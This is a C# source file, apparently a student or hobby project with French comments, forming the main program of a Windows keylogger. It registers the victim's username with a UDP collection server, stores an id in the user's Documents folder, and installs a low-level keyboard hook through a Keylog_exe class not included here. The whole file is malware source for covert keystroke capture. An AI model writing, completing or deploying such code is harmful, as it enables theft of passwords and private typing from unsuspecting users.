using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Sockets;
using static System.Net.Mime.MediaTypeNames;

namespace Keylog
{
    class Program
    {
        static int getLenght_byte(byte[] b)
        {
            int a  = 0;
            foreach(byte elem in b)
            {
                a++;
            }
            return a;
        }

        public static string getName()
        {
            //Si on a déja un fichier existant
            if(File.Exists(@"C:\Users\"+Environment.UserName+@"\Documents\user.txt"))
            {
                StreamReader sr = new StreamReader(@"C:\Users\"+Environment.UserName+@"\Documents\user.txt");
                string ligne = "";
                string name ="";
			    while ((ligne = sr.ReadLine()) != null)
                {
                    name = ligne;
                }
                return name;
            }
            else //Sinon on doit récupérer un bom et créer le fichier et écrire dedans
            {
                string name = "creation utilisateur svp;"+ Environment.UserName;
                UdpClient client  = new UdpClient();
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse("127.0.0.1"),6666);
                client.Connect(ep);
                byte[] b = Encoding.ASCII.GetBytes(name);
                client.Send(b,getLenght_byte(b));
                byte[] name_b = client.Receive(ref ep);

                name = Encoding.Default.GetString(name_b);

                StreamWriter sw = new StreamWriter(@"C:\Users\"+Environment.UserName+@"\Documents\user.txt",false);
                sw.WriteLine(name);
                sw.Close();
                
                return name;

            }
            

        }

        
        private static IntPtr hook = IntPtr.Zero;
        
        


        static void Main(string[] args)
        {
            string name = getName();
            
            Keylog_exe kl = new Keylog_exe(name);
            
            hook = Keylog_exe.SetHook(Keylog_exe.llkProcedure);
            
            System.Windows.Forms.Application.Run();
            
            Keylog_exe.UnhookWindowsHookEx(hook); // permet d'enlever le keylogger, peut a essayer sur une vm
        }

        
    }
}
